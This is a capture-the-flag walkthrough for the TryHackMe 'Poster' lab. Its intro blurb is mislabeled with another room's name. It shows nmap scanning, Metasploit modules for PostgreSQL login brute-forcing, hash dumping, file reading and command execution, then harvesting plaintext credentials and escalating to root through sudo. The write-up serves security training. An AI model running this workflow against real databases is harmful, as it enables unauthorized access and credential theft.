---
title: Walkthrough - Poster
published: true
---

RDBMS, SQL, Enumeration, Metasploit. Time to enter the warren... Can you hack into the Year of the Rabbit box without falling down a hole?

[https://tryhackme.com/room/yearoftherabbit](https://tryhackme.com/room/yearoftherabbit)

* * *

## Notes

- `sudo nmap -sV -sS -sC -O -p22,80,5432 -T4 10.10.5.243`

```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 71:ed:48:af:29:9e:30:c1:b6:1d:ff:b0:24:cc:6d:cb (RSA)
|   256 eb:3a:a3:4e:6f:10:00:ab:ef:fc:c5:2b:0e:db:40:57 (ECDSA)
|_  256 3e:41:42:35:38:05:d3:92:eb:49:39:c6:e3:ee:78:de (ED25519)
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Poster CMS
|_http-server-header: Apache/2.4.18 (Ubuntu)
5432/tcp open  postgresql PostgreSQL DB 9.5.8 - 9.5.10 or 9.5.17 - 9.5.21
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Not valid before: 2020-07-29T00:54:25
|_Not valid after:  2030-07-27T00:54:25
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 5.4 (94%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 5.1 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

* * * 

## What is the rdbms installed on the server?

- postgresql

* * * 

## What port is the rdbms running on?

- 5432

* * * 

## Metasploit contains a variety of modules that can be used to enumerate in multiple rdbms, making it easy to gather valuable information. After starting Metasploit, search for an associated auxiliary module that allows us to enumerate user credentials. What is the full path of the modules (starting with auxiliary)?

- `msf6 auxiliary(scanner/postgres/postgres_login) > set rhosts 10.10.5.243`

* * * 

## What are the credentials you found? user:password

- `[+] 10.10.5.243:5432 - Login Successful: postgres:password@template1`

* * * 

## What is the full path of the module that allows you to execute commands with the proper user credentials (starting with auxiliary)?

```
msf6 auxiliary(admin/postgres/postgres_sql) > run
[*] Running module against 10.10.5.243

Query Text: 'select version()'
==============================

    version
    -------
    PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit

[*] Auxiliary module execution completed
```

* * * 

## Based on the results of #6, what is the rdbms version installed on the server?

- 9.5.21

* * * 

## What is the full path of the module that allows for dumping user hashes (starting with auxiliary)?

- `auxiliary/admin/postgres/postgres_sql`

* * * 

## How many user hashes does the module dump?

```
msf6 auxiliary(scanner/postgres/postgres_hashdump) > run

[+] Query appears to have run successfully
[+] Postgres Server Hashes
======================

 Username   Hash
 --------   ----
 darkstart  md58842b99375db43e9fdf238753623a27d
 poster     md578fb805c7412ae597b399844a54cce0a
 postgres   md532e12f215ba27cb750c9e093ce4b5127
 sistemas   md5f7dbc0d5a06653e74da6b1af9290ee2b
 ti         md57af9ac4c593e9e4f275576e13f935579
 tryhackme  md503aab1165001c8f8ccae31a8824efddc

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

* * * 

## What is the full path of the module (starting with auxiliary) that allows an authenticated user to view files of their choosing on the server?

- `auxiliary/admin/postgres/postgres_readfile`

* * * 

## What is the full path of the module that allows arbitrary command execution with the proper user credentials (starting with exploit)?

- `exploit/multi/postgres/postgres_copy_from_program_cmd_exec`

* * * 

## Compromise the machine and locate user.txt

Found in a users dir:

```
postgres@ubuntu:/home/dark$ cat credentials.txt 
cat credentials.txt
dark:qwerty1234#!hackme
```

- we are able to loging via ssh with these creds

- `cat /etc/crontab` we find root is running a script `root    cd /opt/ufw && bash ufw.sh`

```
$ cat ufw.sh
ufw disable
```

we dont have access to write to this file. might be able to do soemthing with PATH but check some other things first. run linpeas.sh

find some loot

- `$dbpass = "p4ssw0rdS3cur3!#";  `
- /var/www/html/config.php
```
dark@ubuntu:/var/www/html$ cat config.php
<?php 

        $dbhost = "127.0.0.1";
        $dbuname = "alison";
        $dbpass = "p4ssw0rdS3cur3!#";
        $dbname = "mysudopassword";
```

- su to alison with creds

* * * 

## Escalate privileges and obtain root.txt

- `sudo -l`
- `alison@ubuntu:/$ sudo cat root/root.txt`

* * * 

